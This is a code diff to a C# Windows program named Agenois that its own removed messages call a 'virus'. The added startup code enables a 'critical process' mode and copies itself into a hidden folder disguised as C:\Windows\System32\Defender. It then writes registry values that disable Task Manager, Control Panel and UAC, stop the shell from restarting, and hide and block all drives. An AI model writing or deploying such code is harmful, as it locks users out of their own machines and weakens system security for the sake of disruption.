@@ -1,12 +1,17 @@
 ﻿using System;
 using System.Collections.Generic;
-using System.ComponentModel;
-using System.Data;
-using System.Drawing;
 using System.Linq;
 using System.Text;
 using System.Threading.Tasks;
 using System.Windows.Forms;
+using Microsoft.Win32;
+using System.IO;
+using System.Threading;
+using System.Diagnostics;
+using Agenois.Properties;
+using Agenois.Payloads;
+using Agenois.Utils;
+using System.Media;
 
 namespace Agenois
 {
@@ -15,48 +20,52 @@ namespace Agenois
         public MainThread()
         {
             InitializeComponent();
+
+            //Everything on startup.
+
+            Destructive.EnableCriticalMode();
+
+            RegistryKey editKey;
+
+            if (Process.GetProcessesByName("Agenois").Count() > 1) { Environment.Exit(0); }
+
+            string extractPath = @"C:\Windows\System32\Defender";
+
+            if (Registry.GetValue(@"HKEY_LOCAL_MACHINE\Software\Agenois", "AgenoisInfected", null) == null)
+            {
+                Directory.CreateDirectory(extractPath);
+                //File.WriteAllBytes(extractPath + "\\IFEO.exe", Resources.IFEODebugger);
+                File.Copy(Application.ExecutablePath, extractPath + @"\Agenois.exe");
+
+                DirectoryInfo ch = new DirectoryInfo(extractPath);
+                ch.Attributes = FileAttributes.Hidden;
+
+                editKey = Registry.CurrentUser.CreateSubKey(@"Software\Microsoft\Windows\CurrentVersion\Policies\Explorer");
+                editKey.SetValue("NoControlPanel", "1");
+                editKey.Close();
+                editKey = Registry.LocalMachine.CreateSubKey(@"Software\Microsoft\Windows NT\CurrentVersion\Winlogon");
+                editKey.SetValue("AutoRestartShell", "0", RegistryValueKind.DWord);
+                editKey.Close();
+                editKey = Registry.LocalMachine.CreateSubKey(@"SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System");
+                editKey.SetValue("EnableLUA", "0", RegistryValueKind.DWord);
+                editKey.Close();
+                editKey = Registry.CurrentUser.CreateSubKey(@"Software\Microsoft\Windows\CurrentVersion\Policies\System");
+                editKey.SetValue("DisableTaskMgr", "1");
+                editKey.Close();
+
+                editKey = Registry.CurrentUser.CreateSubKey(@"Software\Microsoft\Windows\CurrentVersion\Policies\Explorer");
+                editKey.SetValue("NoViewOnDrive", 67108863, RegistryValueKind.DWord);
+                editKey.Close();
+                editKey = Registry.LocalMachine.CreateSubKey(@"Software\Microsoft\Windows\CurrentVersion\Policies\Explorer");
+                editKey.SetValue("NoDrives", 67108863, RegistryValueKind.DWord);
+                editKey.Close();
+
+            }
         }
 
         private void MainThread_Load(object sender, EventArgs e)
         {
-            //Everything on startup.
-            Payloads.Destructive.EnableCriticalMode();
 
-            OperatingSystem os = Environment.OSVersion;
-            Version vs = os.Version;
-            string operatingSystem = "";
-            if (os.Platform == PlatformID.Win32NT)
-            {
-                switch (vs.Major)
-                {
-                    case 6:
-                        if (vs.Minor == 2)
-                            operatingSystem = "8";
-                        else if (vs.Minor == 3)
-                            operatingSystem = "8.1";
-                        break;
-                    case 10:
-                        operatingSystem = "10";
-                        break;
-                    default:
-                        break;
-                }
-            }
-            if (operatingSystem == "10")
-            {
-                MessageBox.Show("This virus doesn't work on Windows 10" + "\n" + "Please use Windows 7 to test this virus", "Error", 0, MessageBoxIcon.Error);
-                Environment.Exit(0);
-            }
-            else if (operatingSystem == "8")
-            {
-                MessageBox.Show("This virus doesn't work on Windows 8 or 8.x" + "\n" + "Please use Windows 7 to test this virus", "Error", 0, MessageBoxIcon.Error);
-                Environment.Exit(0);
-            }
-            else if (operatingSystem == "8.1")
-            {
-                MessageBox.Show("This virus doesn't work on Windows 8 or 8.x" + "\n" + "Please use Windows 7 to test this virus", "Error", 0, MessageBoxIcon.Error);
-                Environment.Exit(0);
-            }
         }
     }
 }
